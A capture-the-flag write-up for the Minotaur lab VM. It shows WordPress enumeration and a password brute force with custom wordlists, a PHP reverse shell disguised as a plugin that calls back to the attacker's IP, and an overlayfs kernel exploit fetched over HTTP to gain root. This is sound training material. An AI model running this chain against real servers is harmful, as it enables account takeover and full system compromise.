# BNE0x00
Initial recon shows a few ports open. Manually checking port 2020 shows that there is a FTP server running on that port. The NMAP script scan does not show anything too interesting besides banners, anonymous FTP account and that Apache vulnerable to Slowloris.
```console
root@kali:~# nmap -p- -sC 192.168.56.223 -Pn -T5

Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-01 05:31 EDT
Nmap scan report for 192.168.56.223
Host is up (0.000038s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2020/tcp open  xinupageserver
MAC Address: 52:54:00:62:FF:C9 (QEMU virtual NIC)
root@kali:~# nc 192.168.56.223 2020
220 Welcome to minotaur FTP service.
^C
Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds
root@kali:~# nmap -p22,80,2020 -sS -sV -O -Pn --script "(ssh* or http-* or ftp* or banner-plus) and not http-slowloris" --script-args=unsafe=1 192.168.56.223
Nmap scan report for 192.168.56.223
Host is up (0.00010s latency).
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
---8<---
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
---8<---
| http-headers:
|   Date: Sun, 01 May 2016 09:32:56 GMT
|   Server: Apache/2.4.7 (Ubuntu)
|   Last-Modified: Thu, 14 May 2015 10:02:26 GMT
|   ETag: "2cf6-51607d32b8a3b"
|   Accept-Ranges: bytes
|   Content-Length: 11510
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|
|_  (Request type: HEAD)
---8<---
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
---8<---
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
---8<---
2020/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-brute:
|   Accounts: No valid accounts found
|_  Statistics: Performed 1926 guesses in 603 seconds, average tps: 3
MAC Address: 52:54:00:62:FF:C9 (QEMU virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: Host: minotaur; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 617.59 seconds
```
I manually confirmed the anonymous FTP login finding but it did not lead to anything interesting. There were  no files I could view and I could not upload files.
```console
root@kali:~# ftp 192.168.56.223 2020
Connected to 192.168.56.223.
220 Welcome to minotaur FTP service.
Name (192.168.56.223:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> put test
local: test remote: test
200 PORT command successful. Consider using PASV.
550 Permission denied.
```
Running Nikto does not turn up anything interesting.
```console
root@kali:~# nikto -h 192.168.56.223:80 -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.223
+ Target Hostname:    192.168.56.223
+ Target Port:        80
+ Start Time:         2016-05-01 05:02:27 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2cf6 0x51607d32b8a3b 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26170 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2016-05-01 05:03:07 (GMT-4) (40 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Opening up the target in a browser shows a default Apache installation for Ubuntu. I proceeded to run dirbuster to search for directories. I was able to find a wordpress installation under /bull/.
```console
root@kali:~# dirbuster -u http://192.168.56.223/ -l /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /icons/ - 403
Dir found: /icons/small/ - 403
Dir found: /bull/ - 200
File found: /bull/index.php - 301
Dir found: /bull/wp-content/ - 200
---8<---
```
I then proceeded to enumerate the wordpress installation using wpscan which showed the installation was out of date and that  there were a few vulnerable components.
```console
root@kali:~# wpscan --url 192.168.56.223/bull/ --enumerate u,p,t,tt
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.223/bull/
[+] Started: Sun May  1 05:16:36 2016

[!] The WordPress 'http://192.168.56.223/bull/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.4.7 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.5.9-1ubuntu4.6
[+] XML-RPC Interface available under: http://192.168.56.223/bull/xmlrpc.php
[!] Upload directory has directory listing enabled: http://192.168.56.223/bull/wp-content/uploads/

[+] WordPress version 4.2.2 identified from advanced fingerprinting
[!] 15 vulnerabilities identified from the version number

[!] Title: WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8111
    Reference: https://wordpress.org/news/2015/07/wordpress-4-2-3/
    Reference: https://twitter.com/klikkioy/status/624264122570526720
    Reference: https://klikki.fi/adv/wordpress3.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
[i] Fixed in: 4.2.3

[!] Title: WordPress <= 4.2.3 - wp_untrash_post_comments SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8126
    Reference: https://github.com/WordPress/WordPress/commit/70128fe7605cb963a46815cf91b0a5934f70eff5
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2213
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Timing Side Channel Attack
    Reference: https://wpvulndb.com/vulnerabilities/8130
    Reference: https://core.trac.wordpress.org/changeset/33536
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5730
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Widgets Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8131
    Reference: https://core.trac.wordpress.org/changeset/33529
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5732
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Nav Menu Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8132
    Reference: https://core.trac.wordpress.org/changeset/33541
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5733
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8133
    Reference: https://core.trac.wordpress.org/changeset/33549
    Reference: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8186
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - User List Table Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8187
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: https://github.com/WordPress/WordPress/commit/f91a5fd10ea7245e5b41e288624819a37adf290a
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7989
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - Publish Post and Mark as Sticky Permission Issue
    Reference: https://wpvulndb.com/vulnerabilities/8188
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5715
[i] Fixed in: 4.2.5

[!] Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8358
    Reference: https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
[i] Fixed in: 4.2.6

[!] Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8376
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36435
    Reference: https://hackerone.com/reports/110801
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
[i] Fixed in: 4.2.7

[!] Title: WordPress 3.7-4.4.1 - Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/8377
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36444
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221
[i] Fixed in: 4.2.7

[!] Title: WordPress <= 4.4.2 - SSRF Bypass using Octal & Hexedecimal IP addresses
    Reference: https://wpvulndb.com/vulnerabilities/8473
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://github.com/WordPress/WordPress/commit/af9f0520875eda686fd13a427fd3914d7aded049
[i] Fixed in: 4.5

[!] Title: WordPress <= 4.4.2 - Reflected XSS in Network Settings
    Reference: https://wpvulndb.com/vulnerabilities/8474
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://github.com/WordPress/WordPress/commit/cb2b3ed3c7d68f6505bfb5c90257e6aaa3e5fcb9
[i] Fixed in: 4.5

[!] Title: WordPress <= 4.4.2 - Script Compression Option CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8475
    Reference: https://codex.wordpress.org/Version_4.5
[i] Fixed in: 4.5

[+] WordPress theme in use: twentyfourteen - v1.4

[+] Name: twentyfourteen - v1.4
 |  Location: http://192.168.56.223/bull/wp-content/themes/twentyfourteen/
[!] The version is out of date, the latest version is 1.7
 |  Style URL: http://192.168.56.223/bull/wp-content/themes/twentyfourteen/style.css
 |  Theme Name: Twenty Fourteen
 |  Theme URI: https://wordpress.org/themes/twentyfourteen/
 |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating installed plugins (only ones marked as popular) ...

   Time: 00:00:01 <===================================================================> (1000 / 1000) 100.00% Time: 00:00:01

[+] We found 2 plugins:

[+] Name: akismet - v3.1.1
 |  Location: http://192.168.56.223/bull/wp-content/plugins/akismet/
 |  Readme: http://192.168.56.223/bull/wp-content/plugins/akismet/readme.txt
[!] The version is out of date, the latest version is 3.1.10

[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8215
    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
[i] Fixed in: 3.1.5

[+] Name: slideshow-gallery - v1.4.6
 |  Location: http://192.168.56.223/bull/wp-content/plugins/slideshow-gallery/
 |  Readme: http://192.168.56.223/bull/wp-content/plugins/slideshow-gallery/readme.txt
[!] The version is out of date, the latest version is 1.6.3
[!] Directory listing is enabled: http://192.168.56.223/bull/wp-content/plugins/slideshow-gallery/

[!] Title: Slideshow Gallery < 1.4.7 Arbitrary File Upload
    Reference: https://wpvulndb.com/vulnerabilities/7532
    Reference: http://seclists.org/bugtraq/2014/Sep/1
    Reference: http://packetstormsecurity.com/files/131526/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
    Reference: https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload
    Reference: https://www.exploit-db.com/exploits/34681/
    Reference: https://www.exploit-db.com/exploits/34514/
[i] Fixed in: 1.4.7

[!] Title: Tribulant Slideshow Gallery <= 1.5.3 - Arbitrary file upload & Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8263
    Reference: http://cinu.pl/research/wp-plugins/mail_5954cbf04cd033877e5415a0c6fba532.html
    Reference: http://blog.cinu.pl/2015/11/php-static-code-analysis-vs-top-1000-wordpress-plugins.html
[i] Fixed in: 1.5.3.4

[+] Enumerating installed themes (only ones marked as popular) ...

   Time: 00:00:00 <=====================================================================> (400 / 400) 100.00% Time: 00:00:00

[+] We found 1 themes:

[+] Name: twentyfourteen - v1.4
 |  Location: http://192.168.56.223/bull/wp-content/themes/twentyfourteen/
[!] The version is out of date, the latest version is 1.7
 |  Style URL: http://192.168.56.223/bull/wp-content/themes/twentyfourteen/style.css
 |  Theme Name: Twenty Fourteen
 |  Theme URI: https://wordpress.org/themes/twentyfourteen/
 |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating timthumb files ...

   Time: 00:00:03 <===================================================================> (2539 / 2539) 100.00% Time: 00:00:03

[+] No timthumb files found

[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-------+-------+
    | Id | Login | Name  |
    +----+-------+-------+
    | 1  | bully | bully |
    +----+-------+-------+

[+] Finished: Sun May  1 05:16:58 2016
[+] Requests Done: 4002
[+] Memory used: 173.766 MB
[+] Elapsed time: 00:00:21
```
I initially tried to bruteforce the password of bully using a wordlist but after letting it run for an hour with no success I moved onto creating a custom wordlist as suggested in the hints. I created my custom wordlist using cewl which crawled the wordpress site looking for unique words.
```console
root@kali:~# cewl -w wordlist http://192.168.56.223/bull/
CeWL 5.1 Robin Wood (robin@digi.ninja) (http://digi.ninja)
```
I then tried bruteforcing using the generated wordlist.
```console
root@kali:~# wpscan --url 192.168.56.223/bull/ --username bully --wordlist /root/wordlist
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.223/bull/
[+] Started: Sun May  1 05:48:47 2016

[!] The WordPress 'http://192.168.56.223/bull/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.4.7 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.5.9-1ubuntu4.6
---8<---
[+] Starting the password brute forcer
  Brute Forcing 'bully' Time: 00:00:07 <================================================ > (485 / 486) 99.79%  ETA: 00:00:00

  +----+-------+------+----------+
  | Id | Login | Name | Password |
  +----+-------+------+----------+
  |    | bully |      |          |
  +----+-------+------+----------+

[+] Finished: Sun May  1 05:48:59 2016
[+] Requests Done: 536
[+] Memory used: 74.746 MB
[+] Elapsed time: 00:00:11
```
With the bruteforce failing I moved onto mangling the wordlist in the hopes that the password is a combination or variant of words in the custom wordlist. This was done using john the ripper.
```console
root@kali:~# john --wordlist=wordlist --rules --stdout > wordlist2
Press 'q' or Ctrl-C to abort, almost any other key for status
21515p 0:00:00:00 100.00% (2016-05-01 05:51) 195590p/s Mailing
```
With the new mangled wordlist I tried bruteforcing again and I was successful in guessing the password of **bully** which is  **Bighornedbulls**
```console
root@kali:~# wpscan --url 192.168.56.223/bull/ --username bully --wordlist /root/wordlist2
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.223/bull/
[+] Started: Sun May  1 05:51:29 2016

[!] The WordPress 'http://192.168.56.223/bull/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.4.7 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.5.9-1ubuntu4.6
---8<---
[+] Starting the password brute forcer
  Brute Forcing 'bully' Time: 00:05:08 <========================================     > (19640 / 21516) 91.28%  ETA: 00:00:29
  [+] [SUCCESS] Login : bully Password : Bighornedbulls


  +----+-------+------+----------------+
  | Id | Login | Name | Password       |
  +----+-------+------+----------------+
  |    | bully |      | Bighornedbulls |
  +----+-------+------+----------------+

[+] Finished: Sun May  1 05:56:40 2016
[+] Requests Done: 19691
[+] Memory used: 113.141 MB
[+] Elapsed time: 00:05:10
```
When logged in as bully you have administrator rights. Getting an interactive shell for me was as simple as installing a Wordpress plugin. To create the wordpress plugin first download a downloading a [php reverse shell](pentestmonkey.net/tools/web-shells/php-reverse-shell), add the following comment block and add the file into a zip file. If you do not have the below header, wordpress will refuse to install the plugin. The head of your modified php reverse shell which works with wordpress should look something similar to the following:
```php
<?php
 /*
 Plugin Name: wp-prs
 Plugin URI: wp-prs
 Description: wp-prs
 Author: wp-prs
 Version: 1.0
 Author URI: wp-prs
 */

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.56.100';  
$port = 443;       
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
```console
root@kali:~# vi wp-prs.php
root@kali:~# zip wp-prs.zip wp-prs.php
```
After installing the wordpress plugin you can start your reverse shell by browsing to where the plugin is installed.
```console
root@kali:~# curl 'http://192.168.56.223/bull/wp-content/plugins/wp-prs1/wp-prs.php'
root@kali:~# nc -lvvp 443
listening on [any] 443 ...
192.168.56.223: inverse host lookup failed: Unknown host
connect to [192.168.56.100] from (UNKNOWN) [192.168.56.223] 34461
Linux minotaur 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
 21:05:46 up  2:39,  0 users,  load average: 0.17, 0.07, 0.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ gcc
gcc: fatal error: no input files
compilation terminated.
```
A quick google search for 3.16.0-30-generic shows that it's vulnerable to a [overlayfs privledge escalation vulnerability](https://www.exploit-db.com/exploits/37292/). Lets download the exploit and serve the file over http using python's SimpleHTTPServer so we can download it to the server.
```console
root@kali:~# wget https://www.kernel-exploits.com/media/ofs_32.c
--2016-05-01 07:06:49--  https://www.kernel-exploits.com/media/ofs_32.c
Resolving www.kernel-exploits.com (www.kernel-exploits.com)... 104.31.67.163, 104.31.66.163
Connecting to www.kernel-exploits.com (www.kernel-exploits.com)|104.31.67.163|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5123 (5.0K) [text/x-csrc]
Saving to: 'ofs_32.c'

ofs_32.c    100%[=====================================================================>]   5.00K  --.-KB/s    in 0s

2016-05-01 07:06:50 (80.4 MB/s) - 'ofs_32.c' saved [5123/5123]
root@kali:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.56.223 - - [01/May/2016 07:08:06] "GET /ofs_32.c HTTP/1.1" 200 -
```
Back on the server, lets run the exploit and get the flag.
```console
$ cd /tmp
$ wget http://192.168.56.100/ofs_32.c
--2016-05-01 21:08:05--  http://192.168.56.100/ofs_32.c
Connecting to 192.168.56.100:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5123 (5.0K) [text/plain]
Saving to: 'ofs_32.c'

     0K .....                                                 100% 1.23G=0s

2016-05-01 21:08:05 (1.23 GB/s) - 'ofs_32.c' saved [5123/5123]

$ gcc ofs_32.c
$ ./a.out
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
flag.txt
peda
quotes.txt
# cat flag.txt
Congrats! You got the final flag!
Th3 Fl@g is: 5urr0nd3d bY @r$3h0l35
# cat quotes.txt
And for me the only way to live life is to grab the bull but the horns and call up recording studios and set dates to go in recording studios. To try and accomplish somthing.
If you can't dazzle them with brilliance, baffle them with bull.
I admire bull riders for their passion and the uniqueness each one of them has.
I am a huge bull on this country. We will not have a double-dip recession at all. I see our businesses coming back almost across the board.
Not only the bull attacks his enemies with curved horn, but also the sheep, when harmed fights fights back.
Sometimes I'm kind of spacey. I'm like Ferdinand the bull, sniffing the daisey, not aware of time, of what's going on in the world.
There comes a time in the affairs of man when he must take the bull by the tail and face the situation.
Bulls do not win full fights. People do.
```
The flag is **5urr0nd3d bY @r$3h0l35**.
### Credits amd thanks
Thanks to Robert Winkel(@RobertWinkel) for creating the CTF. It was quite an interesting CTF especially the wordlist generation stuff. I learnt how to generate wordlists using cewl and also wordlist mangling.
